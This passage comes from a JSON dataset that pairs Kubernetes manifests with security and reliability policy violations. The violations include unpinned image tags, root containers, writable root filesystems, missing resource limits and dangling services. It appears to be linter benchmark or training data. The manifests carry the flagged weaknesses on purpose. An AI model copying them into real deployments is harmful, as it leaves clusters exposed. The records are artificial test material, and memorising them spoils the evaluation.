--csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"liveness-probe\" has memory limit 0"
  },
  {
    "id": "7302",
    "manifest_path": "data/manifests/the_stack_sample/sample_2663.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: loadgen\n  labels:\n    app: loadgen\nspec:\n  containers:\n  - name: loadgen\n    image: dynatrace/easytravel-loadgen\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"loadgen\" is using an invalid container image, \"dynatrace/easytravel-loadgen\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7303",
    "manifest_path": "data/manifests/the_stack_sample/sample_2663.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: loadgen\n  labels:\n    app: loadgen\nspec:\n  containers:\n  - name: loadgen\n    image: dynatrace/easytravel-loadgen\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"loadgen\" does not have a read-only root file system"
  },
  {
    "id": "7304",
    "manifest_path": "data/manifests/the_stack_sample/sample_2663.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: loadgen\n  labels:\n    app: loadgen\nspec:\n  containers:\n  - name: loadgen\n    image: dynatrace/easytravel-loadgen\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"loadgen\" is not set to runAsNonRoot"
  },
  {
    "id": "7305",
    "manifest_path": "data/manifests/the_stack_sample/sample_2663.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: loadgen\n  labels:\n    app: loadgen\nspec:\n  containers:\n  - name: loadgen\n    image: dynatrace/easytravel-loadgen\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"loadgen\" has cpu request 0"
  },
  {
    "id": "7306",
    "manifest_path": "data/manifests/the_stack_sample/sample_2663.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: loadgen\n  labels:\n    app: loadgen\nspec:\n  containers:\n  - name: loadgen\n    image: dynatrace/easytravel-loadgen\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"loadgen\" has memory limit 0"
  },
  {
    "id": "7307",
    "manifest_path": "data/manifests/the_stack_sample/sample_2666.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  selector:\n    app: frontend\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:frontend])"
  },
  {
    "id": "7308",
    "manifest_path": "data/manifests/the_stack_sample/sample_2667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9924\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7309",
    "manifest_path": "data/manifests/the_stack_sample/sample_2667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9924\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7310",
    "manifest_path": "data/manifests/the_stack_sample/sample_2667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9924\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7311",
    "manifest_path": "data/manifests/the_stack_sample/sample_2667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9924\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7312",
    "manifest_path": "data/manifests/the_stack_sample/sample_2667.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9924\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7313",
    "manifest_path": "data/manifests/the_stack_sample/sample_2671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernete-d784\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernete-d784\n  template:\n    metadata:\n      labels:\n        app: kubernete-d784\n    spec:\n      containers:\n      - name: kubernete-d784\n        image: kubernestusregistry.azurecr.io/kubernete\n        ports:\n        - containerPort: 8123\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kubernete-d784\" is using an invalid container image, \"kubernestusregistry.azurecr.io/kubernete\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7314",
    "manifest_path": "data/manifests/the_stack_sample/sample_2671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernete-d784\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernete-d784\n  template:\n    metadata:\n      labels:\n        app: kubernete-d784\n    spec:\n      containers:\n      - name: kubernete-d784\n        image: kubernestusregistry.azurecr.io/kubernete\n        ports:\n        - containerPort: 8123\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7315",
    "manifest_path": "data/manifests/the_stack_sample/sample_2671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernete-d784\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernete-d784\n  template:\n    metadata:\n      labels:\n        app: kubernete-d784\n    spec:\n      containers:\n      - name: kubernete-d784\n        image: kubernestusregistry.azurecr.io/kubernete\n        ports:\n        - containerPort: 8123\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubernete-d784\" does not have a read-only root file system"
  },
  {
    "id": "7316",
    "manifest_path": "data/manifests/the_stack_sample/sample_2671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernete-d784\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernete-d784\n  template:\n    metadata:\n      labels:\n        app: kubernete-d784\n    spec:\n      containers:\n      - name: kubernete-d784\n        image: kubernestusregistry.azurecr.io/kubernete\n        ports:\n        - containerPort: 8123\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kubernete-d784\" is not set to runAsNonRoot"
  },
  {
    "id": "7317",
    "manifest_path": "data/manifests/the_stack_sample/sample_2671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernete-d784\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernete-d784\n  template:\n    metadata:\n      labels:\n        app: kubernete-d784\n    spec:\n      containers:\n      - name: kubernete-d784\n        image: kubernestusregistry.azurecr.io/kubernete\n        ports:\n        - containerPort: 8123\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kubernete-d784\" has cpu request 0"
  },
  {
    "id": "7318",
    "manifest_path": "data/manifests/the_stack_sample/sample_2671.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubernete-d784\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubernete-d784\n  template:\n    metadata:\n      labels:\n        app: kubernete-d784\n    spec:\n      containers:\n      - name: kubernete-d784\n        image: kubernestusregistry.azurecr.io/kubernete\n        ports:\n        - containerPort: 8123\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kubernete-d784\" has memory limit 0"
  },
  {
    "id": "7319",
    "manifest_path": "data/manifests/the_stack_sample/sample_2672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1474\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7320",
    "manifest_path": "data/manifests/the_stack_sample/sample_2672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1474\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7321",
    "manifest_path": "data/manifests/the_stack_sample/sample_2672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1474\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7322",
    "manifest_path": "data/manifests/the_stack_sample/sample_2672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1474\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7323",
    "manifest_path": "data/manifests/the_stack_sample/sample_2672.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1474\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7324",
    "manifest_path": "data/manifests/the_stack_sample/sample_2673.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: paymentservice\n        image: vzaletny/hipster_shop_payment:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7325",
    "manifest_path": "data/manifests/the_stack_sample/sample_2673.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: paymentservice\n        image: vzaletny/hipster_shop_payment:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"paymentservice\" does not have a read-only root file system"
  },
  {
    "id": "7326",
    "manifest_path": "data/manifests/the_stack_sample/sample_2673.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: paymentservice\n        image: vzaletny/hipster_shop_payment:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"paymentservice\" is not set to runAsNonRoot"
  },
  {
    "id": "7327",
    "manifest_path": "data/manifests/the_stack_sample/sample_2673.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: paymentservice\n        image: vzaletny/hipster_shop_payment:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"paymentservice\" has cpu request 0"
  },
  {
    "id": "7328",
    "manifest_path": "data/manifests/the_stack_sample/sample_2673.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      serviceAccountName: default\n      containers:\n      - name: paymentservice\n        image: vzaletny/hipster_shop_payment:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"paymentservice\" has memory limit 0"
  },
  {
    "id": "7329",
    "manifest_path": "data/manifests/the_stack_sample/sample_2675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: server-users\n  template:\n    metadata:\n      labels:\n        component: server-users\n    spec:\n      containers:\n      - name: server-users\n        image: riliadmin/users-service:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 75m\n        ports:\n        - containerPort: 7770\n        env:\n        - name: USERS_SERVICE_API_PORT\n          value: '7770'\n        - name: URI_WHITELIST\n          value: https://rili.network,https://www.rili.network\n        - name: HONEYCOMB_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: honeycomb-writekey\n              key: key\n        - name: LOG_LEVEL\n          value: info\n        - name: REDIS_NODE_ONE_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_NODE_ONE_PORT\n          value: '6379'\n        - name: PG_USER\n          value: postgres\n        - name: PG_HOST\n          value: postgres-cluster-ip-service\n        - name: PG_PORT\n          value: '5432'\n        - name: USERS_SERVICE_PG_DATABASE\n          value: rili_users\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n        - name: SECRET\n          valueFrom:\n            secretKeyRef:\n              name: riliapisecret\n              key: RILIAPISECRET\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server-users\" is using an invalid container image, \"riliadmin/users-service:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7330",
    "manifest_path": "data/manifests/the_stack_sample/sample_2675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: server-users\n  template:\n    metadata:\n      labels:\n        component: server-users\n    spec:\n      containers:\n      - name: server-users\n        image: riliadmin/users-service:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 75m\n        ports:\n        - containerPort: 7770\n        env:\n        - name: USERS_SERVICE_API_PORT\n          value: '7770'\n        - name: URI_WHITELIST\n          value: https://rili.network,https://www.rili.network\n        - name: HONEYCOMB_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: honeycomb-writekey\n              key: key\n        - name: LOG_LEVEL\n          value: info\n        - name: REDIS_NODE_ONE_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_NODE_ONE_PORT\n          value: '6379'\n        - name: PG_USER\n          value: postgres\n        - name: PG_HOST\n          value: postgres-cluster-ip-service\n        - name: PG_PORT\n          value: '5432'\n        - name: USERS_SERVICE_PG_DATABASE\n          value: rili_users\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n        - name: SECRET\n          valueFrom:\n            secretKeyRef:\n              name: riliapisecret\n              key: RILIAPISECRET\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server-users\" does not have a read-only root file system"
  },
  {
    "id": "7331",
    "manifest_path": "data/manifests/the_stack_sample/sample_2675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: server-users\n  template:\n    metadata:\n      labels:\n        component: server-users\n    spec:\n      containers:\n      - name: server-users\n        image: riliadmin/users-service:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 75m\n        ports:\n        - containerPort: 7770\n        env:\n        - name: USERS_SERVICE_API_PORT\n          value: '7770'\n        - name: URI_WHITELIST\n          value: https://rili.network,https://www.rili.network\n        - name: HONEYCOMB_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: honeycomb-writekey\n              key: key\n        - name: LOG_LEVEL\n          value: info\n        - name: REDIS_NODE_ONE_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_NODE_ONE_PORT\n          value: '6379'\n        - name: PG_USER\n          value: postgres\n        - name: PG_HOST\n          value: postgres-cluster-ip-service\n        - name: PG_PORT\n          value: '5432'\n        - name: USERS_SERVICE_PG_DATABASE\n          value: rili_users\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n        - name: SECRET\n          valueFrom:\n            secretKeyRef:\n              name: riliapisecret\n              key: RILIAPISECRET\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server-users\" is not set to runAsNonRoot"
  },
  {
    "id": "7332",
    "manifest_path": "data/manifests/the_stack_sample/sample_2675.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: users-service-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: server-users\n  template:\n    metadata:\n      labels:\n        component: server-users\n    spec:\n      containers:\n      - name: server-users\n        image: riliadmin/users-service:latest\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 75m\n        ports:\n        - containerPort: 7770\n        env:\n        - name: USERS_SERVICE_API_PORT\n          value: '7770'\n        - name: URI_WHITELIST\n          value: https://rili.network,https://www.rili.network\n        - name: HONEYCOMB_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: honeycomb-writekey\n              key: key\n        - name: LOG_LEVEL\n          value: info\n        - name: REDIS_NODE_ONE_HOST\n          value: redis-cluster-ip-service\n        - name: REDIS_NODE_ONE_PORT\n          value: '6379'\n        - name: PG_USER\n          value: postgres\n        - name: PG_HOST\n          value: postgres-cluster-ip-service\n        - name: PG_PORT\n          value: '5432'\n        - name: USERS_SERVICE_PG_DATABASE\n          value: rili_users\n        - name: PG_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pgpassword\n              key: PGPASSWORD\n        - name: SECRET\n          valueFrom:\n            secretKeyRef:\n              name: riliapisecret\n              key: RILIAPISECRET\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server-users\" has cpu request 0"
  },
  {
    "id": "7333",
    "manifest_path": "data/manifests/the_stack_sample/sample_2679.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret-as-env-var\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    env:\n    - name: SECRET_USERNAME\n      valueFrom:\n        secretKeyRef:\n          name: backend-user\n          key: backend-username\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7334",
    "manifest_path": "data/manifests/the_stack_sample/sample_2679.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret-as-env-var\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    env:\n    - name: SECRET_USERNAME\n      valueFrom:\n        secretKeyRef:\n          name: backend-user\n          key: backend-username\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "7335",
    "manifest_path": "data/manifests/the_stack_sample/sample_2679.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret-as-env-var\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    env:\n    - name: SECRET_USERNAME\n      valueFrom:\n        secretKeyRef:\n          name: backend-user\n          key: backend-username\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "7336",
    "manifest_path": "data/manifests/the_stack_sample/sample_2679.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret-as-env-var\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    env:\n    - name: SECRET_USERNAME\n      valueFrom:\n        secretKeyRef:\n          name: backend-user\n          key: backend-username\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "7337",
    "manifest_path": "data/manifests/the_stack_sample/sample_2679.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret-as-env-var\nspec:\n  containers:\n  - name: nginx-container\n    image: nginx\n    env:\n    - name: SECRET_USERNAME\n      valueFrom:\n        secretKeyRef:\n          name: backend-user\n          key: backend-username\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "7338",
    "manifest_path": "data/manifests/the_stack_sample/sample_2680.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mediabot\n  labels:\n    org: empire\n    class: mediabot\nspec:\n  containers:\n  - name: mediabot\n    image: docker.io/tgraf/netperf\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mediabot\" is using an invalid container image, \"docker.io/tgraf/netperf\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7339",
    "manifest_path": "data/manifests/the_stack_sample/sample_2680.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mediabot\n  labels:\n    org: empire\n    class: mediabot\nspec:\n  containers:\n  - name: mediabot\n    image: docker.io/tgraf/netperf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mediabot\" does not have a read-only root file system"
  },
  {
    "id": "7340",
    "manifest_path": "data/manifests/the_stack_sample/sample_2680.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mediabot\n  labels:\n    org: empire\n    class: mediabot\nspec:\n  containers:\n  - name: mediabot\n    image: docker.io/tgraf/netperf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mediabot\" is not set to runAsNonRoot"
  },
  {
    "id": "7341",
    "manifest_path": "data/manifests/the_stack_sample/sample_2680.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mediabot\n  labels:\n    org: empire\n    class: mediabot\nspec:\n  containers:\n  - name: mediabot\n    image: docker.io/tgraf/netperf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mediabot\" has cpu request 0"
  },
  {
    "id": "7342",
    "manifest_path": "data/manifests/the_stack_sample/sample_2680.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mediabot\n  labels:\n    org: empire\n    class: mediabot\nspec:\n  containers:\n  - name: mediabot\n    image: docker.io/tgraf/netperf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mediabot\" has memory limit 0"
  },
  {
    "id": "7343",
    "manifest_path": "data/manifests/the_stack_sample/sample_2681.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pretendapp-prod\n  namespace: identity-demo\nspec:\n  selector:\n    app: pretendapp-prod\n  ports:\n  - port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pretendapp-prod])"
  },
  {
    "id": "7344",
    "manifest_path": "data/manifests/the_stack_sample/sample_2684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"fluxcdbot\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7345",
    "manifest_path": "data/manifests/the_stack_sample/sample_2684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "mismatching-selector",
    "violation_text": "labels in pod spec (map[]) do not match labels in selector (&LabelSelector{MatchLabels:map[string]string{app.kubernetes.io/name: fluxcdbot,},MatchExpressions:[]LabelSelectorRequirement{},})"
  },
  {
    "id": "7346",
    "manifest_path": "data/manifests/the_stack_sample/sample_2684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"fluxcdbot\" does not have a read-only root file system"
  },
  {
    "id": "7347",
    "manifest_path": "data/manifests/the_stack_sample/sample_2684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluxcdbot\" is not set to runAsNonRoot"
  },
  {
    "id": "7348",
    "manifest_path": "data/manifests/the_stack_sample/sample_2684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"fluxcdbot\" has cpu request 0"
  },
  {
    "id": "7349",
    "manifest_path": "data/manifests/the_stack_sample/sample_2684.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: fluxcdbot\n  labels:\n    app.kubernetes.io/name: fluxcdbot\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: fluxcdbot\n  template:\n    spec:\n      containers:\n      - name: fluxcdbot\n        env:\n        - name: TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: telegram-token\n              key: token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"fluxcdbot\" has memory limit 0"
  },
  {
    "id": "7350",
    "manifest_path": "data/manifests/the_stack_sample/sample_2685.yaml",
